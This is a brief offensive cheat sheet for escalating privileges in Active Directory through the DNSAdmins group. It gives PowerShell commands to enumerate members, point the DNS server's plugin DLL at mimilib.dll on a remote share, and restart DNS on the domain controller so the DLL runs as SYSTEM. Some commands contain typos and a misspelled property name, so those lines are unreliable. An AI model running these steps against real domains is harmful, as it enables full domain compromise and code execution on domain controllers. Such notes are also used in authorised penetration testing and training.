# DNSAdmins

* members of the DNSAdmins group to load arbitrary DLL with the privileges of dns.exe (SYSTEM)
* if DC also services DNS, itll provide escalation to DA
* privs required to restart DNS service

#### enumerate members of the DNSAdmins group
```powershell
Get-NetGroupMember -GroupName "DNSAdmins"   ## powerview

GetADGroupMember -Identity DNSAdmins   ## AD module
```

* once we know the members of the dnsadmin group, we need to compromise a member. 

#### as a dnsadmin group member, configure dll using dnscmd.exe (needs RSAT DNS)
```powershell
dnscmd dc-server /config /serverlevelplugindll \\0.0.0.0\dll\mimilib.dll
```

#### using dnsserver module (needs RSAT DNS)
```powershell
$dnsettings = Get-DnsServerSetting -ComputerName dc-server -Verbose -All
$dnsettings.ServerLevelPluginSll = "\\0.0.0.0\dll\mimilib.dll" Set-DnsServerSetting -InputObject $dnsettings -ComputerName dc-server -Verbose
```

Note: to install DNS RSAT tools: 
```powershell
Install-WindowsFeature DNS -IncludeManagementTools -Verbose
```

#### restart the dns service, assuming the dnsadmins group  has permissions
```powershell
sc \\dc-server stop dns
sc \\dc-server start dns 
```

* by default, the mimilib.dll logs all dns queries to C:\Windows\System32\kiwidns.log











